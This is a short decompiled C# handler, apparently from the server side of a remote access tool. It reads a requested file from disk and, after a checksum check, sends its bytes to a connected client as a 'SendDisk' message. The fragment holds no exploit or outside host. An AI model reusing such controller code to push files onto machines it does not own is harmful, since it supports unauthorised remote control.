using System;
using System.IO;
using Leb128;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages
{
	// Token: 0x0200004D RID: 77
	internal class HandlerSendDiskGet
	{
		// Token: 0x060001D0 RID: 464 RVA: 0x0001D058 File Offset: 0x0001B258
		public static void Read(Clients client, object[] objects)
		{
			string text = (string)objects[1];
			if (Methods.GetChecksum(text) == (string)objects[2])
			{
				byte[] data = LEB128.Write(new object[]
				{
					"SendDisk",
					Path.GetExtension(text),
					File.ReadAllBytes(text)
				});
				client.Send(data);
			}
		}
	}
}
